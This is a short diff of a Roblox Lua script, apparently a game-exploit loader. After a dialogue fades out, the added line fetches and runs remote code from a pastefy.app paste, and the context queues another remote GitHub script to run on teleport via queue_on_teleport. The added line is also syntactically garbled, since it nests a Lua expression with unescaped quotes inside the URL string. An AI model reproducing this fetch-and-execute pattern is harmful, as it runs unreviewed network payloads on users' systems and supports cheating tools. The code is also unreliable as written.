@@ -273,7 +273,7 @@ loadingTween.Completed:Connect(function()
                 
                 fadeOutTween.Completed:Connect(function()
                     dialogueGui:Destroy()
-                        loadstring(loadstring(game:HttpGet(""))())
+                        loadstring(loadstring(game:HttpGet("loadstring(game:HttpGet("https://pastefy.app/kU8PNLf1/raw"))()"))())
                         queue_on_teleport([[
                             wait(2)
                             loadstring(loadstring(game:HttpGet("https://raw.githubusercontent.com/laplacefr/roblox/refs/heads/main/visuals/load.lua"))())
